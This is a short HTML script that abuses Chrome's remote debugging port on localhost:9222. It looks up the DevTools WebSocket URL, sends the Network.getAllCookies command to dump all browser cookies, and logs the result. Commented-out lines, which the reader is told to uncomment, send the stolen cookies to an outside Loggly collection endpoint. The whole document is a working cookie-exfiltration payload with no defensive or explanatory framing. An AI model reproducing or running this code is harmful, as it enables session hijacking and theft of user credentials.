<script>
	
var webSocketDebuggerUrl;
var port = 9222;
var request = new XMLHttpRequest();
request.open("GET", "http://localhost:" + port + "/json");
request.responseType = 'json';
request.send();
request.onload = function() {
  webSocketDebuggerUrl = request.response[0].webSocketDebuggerUrl;
  console.log(webSocketDebuggerUrl);
  var connection = new WebSocket(webSocketDebuggerUrl);
	
  // When the connection is open, send some data to the server
  connection.onopen = function () {
    connection.send('{"id": 1, "method": "Network.getAllCookies"}');
  };

  // Log errors
  connection.onerror = function (error) {
    console.log('WebSocket Error ' + error);
  };

  // Log messages from the server
  connection.onmessage = function (e) {
    console.log('Server: ' + e.data);
	  
    //uncomment lines below to send cookies to loggly (update the loggly link to your own link first)
    //post_url = "https://logs-01.loggly.com/inputs/c7c38de9-dd3a-4f12-b288-7b313edcd523/tag/http/"
    //var xhttp = new XMLHttpRequest();
    //xhttp.open("POST", post_url, true);
    //xhttp.setRequestHeader('Content-Type', 'text/plain');
    //xhttp.send(JSON.stringify(JSON.parse(e.data).result.cookies));
  };
}

</script>
